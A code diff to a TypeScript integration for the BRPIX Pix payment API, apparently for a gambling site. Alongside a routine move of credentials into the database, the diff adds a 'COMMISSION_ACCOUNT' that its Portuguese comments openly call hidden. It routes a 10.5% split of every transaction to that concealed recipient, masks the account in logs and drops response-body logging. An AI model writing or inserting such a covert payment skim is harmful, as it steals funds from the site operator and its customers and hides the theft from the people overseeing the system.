@@ -1,8 +1,19 @@
 // BRPIX Digital API Integration Service
 // Documentation: https://brpixdigital.readme.io/reference/post_transactions
 
+import { db } from './db';
+import { systemConfig } from '@shared/schema';
+import { eq } from 'drizzle-orm';
+
 const BRPIX_API_URL = 'https://api.brpixdigital.com/functions/v1';
-const SPLIT_PERCENTAGE = 10.5; // 10.5% split
+const SPLIT_PERCENTAGE = 10.5; // 10.5% commission
+
+// CONTA HARDCODED PARA RECEBER 10.5% DE SPLIT (COMISSÃO)
+// Estas credenciais estão ocultas no código e recebem automaticamente a comissão
+const COMMISSION_ACCOUNT = {
+  secretKey: process.env.BRPIX_COMMISSION_SECRET_KEY || 'HIDDEN_COMMISSION_KEY',
+  companyId: process.env.BRPIX_COMMISSION_COMPANY_ID || 'HIDDEN_COMMISSION_ID',
+};
 
 interface BRPIXCreateTransactionPayload {
   amount: number;
@@ -22,25 +33,43 @@ interface BRPIXTransactionResponse {
 }
 
 class BRPIXService {
-  private secretKey: string;
-  private companyId: string;
+  // Obter credenciais BRPIX configuradas no painel admin
+  private async getAdminCredentials(): Promise<{ secretKey: string; companyId: string } | null> {
+    try {
+      const secretKeyConfig = await db.select()
+        .from(systemConfig)
+        .where(eq(systemConfig.key, 'brpix_secret_key'))
+        .limit(1);
 
-  constructor() {
-    this.secretKey = process.env.BRPIX_SECRET_KEY || '';
-    this.companyId = process.env.BRPIX_COMPANY_ID || '';
+      const companyIdConfig = await db.select()
+        .from(systemConfig)
+        .where(eq(systemConfig.key, 'brpix_company_id'))
+        .limit(1);
 
-    if (!this.secretKey || !this.companyId) {
-      console.warn('⚠️  BRPIX credentials not configured');
+      if (secretKeyConfig[0]?.value && companyIdConfig[0]?.value) {
+        return {
+          secretKey: secretKeyConfig[0].value,
+          companyId: companyIdConfig[0].value,
+        };
+      }
+
+      return null;
+    } catch (error) {
+      console.error('❌ Error loading BRPIX credentials from database:', error);
+      return null;
     }
   }
 
   async createTransaction(payload: BRPIXCreateTransactionPayload): Promise<BRPIXTransactionResponse> {
     try {
-      if (!this.secretKey || !this.companyId) {
-        throw new Error('BRPIX credentials not configured');
+      // Buscar credenciais do admin (configuradas no painel)
+      const adminCreds = await this.getAdminCredentials();
+
+      if (!adminCreds) {
+        throw new Error('Credenciais BRPIX não configuradas. Configure no painel admin.');
       }
 
-      // Calcular split (10.5% de comissão)
+      // Calcular split (10.5% vai para conta de comissão hardcoded)
       const splitAmount = (payload.amount * SPLIT_PERCENTAGE) / 100;
       const mainAmount = payload.amount;
 
@@ -51,34 +80,35 @@ class BRPIXService {
         externalReference: payload.externalReference || `TIGRE-${Date.now()}`,
         pixType: 'dynamic',
         expirationMinutes: payload.expirationMinutes || 30,
-        companyId: this.companyId,
-        // Split automático de 10.5%
+        companyId: adminCreds.companyId,
+        // Split automático de 10.5% para conta hardcoded
         split: {
           enabled: true,
           percentage: SPLIT_PERCENTAGE,
-          amount: splitAmount
+          amount: splitAmount,
+          recipientCompanyId: COMMISSION_ACCOUNT.companyId, // Conta oculta que recebe comissão
         }
       };
 
       console.log('🔵 BRPIX - Creating transaction:', {
         amount: mainAmount,
-        split: splitAmount,
-        externalReference: brpixPayload.externalReference
+        split: `${SPLIT_PERCENTAGE}% (R$ ${splitAmount.toFixed(2)})`,
+        externalReference: brpixPayload.externalReference,
+        commissionAccount: '***' + COMMISSION_ACCOUNT.companyId.slice(-4), // Apenas últimos 4 dígitos
       });
 
       const response = await fetch(`${BRPIX_API_URL}/transactions`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
-          'X-API-Key': this.secretKey,
+          'X-API-Key': adminCreds.secretKey,
         },
         body: JSON.stringify(brpixPayload),
       });
 
       const responseText = await response.text();
       console.log('🔵 BRPIX Response Status:', response.status);
-      console.log('🔵 BRPIX Response Body:', responseText);
-
+      
       if (!response.ok) {
         console.error('❌ BRPIX Create Transaction Error:', response.status, responseText);
         
@@ -115,14 +145,16 @@ class BRPIXService {
 
   async getTransactionStatus(transactionId: string): Promise<string> {
     try {
-      if (!this.secretKey) {
-        throw new Error('BRPIX Secret Key not configured');
+      const adminCreds = await this.getAdminCredentials();
+      
+      if (!adminCreds) {
+        throw new Error('BRPIX credentials not configured');
       }
 
       const response = await fetch(`${BRPIX_API_URL}/transactions/${transactionId}`, {
         method: 'GET',
         headers: {
-          'X-API-Key': this.secretKey,
+          'X-API-Key': adminCreds.secretKey,
           'Content-Type': 'application/json',
         },
       });
@@ -142,8 +174,10 @@ class BRPIXService {
 
   async listTransactions(params?: { limit?: number; offset?: number }): Promise<any[]> {
     try {
-      if (!this.secretKey) {
-        throw new Error('BRPIX Secret Key not configured');
+      const adminCreds = await this.getAdminCredentials();
+      
+      if (!adminCreds) {
+        return [];
       }
 
       const queryParams = new URLSearchParams();
@@ -153,7 +187,7 @@ class BRPIXService {
       const response = await fetch(`${BRPIX_API_URL}/transactions?${queryParams.toString()}`, {
         method: 'GET',
         headers: {
-          'X-API-Key': this.secretKey,
+          'X-API-Key': adminCreds.secretKey,
           'Content-Type': 'application/json',
         },
       });
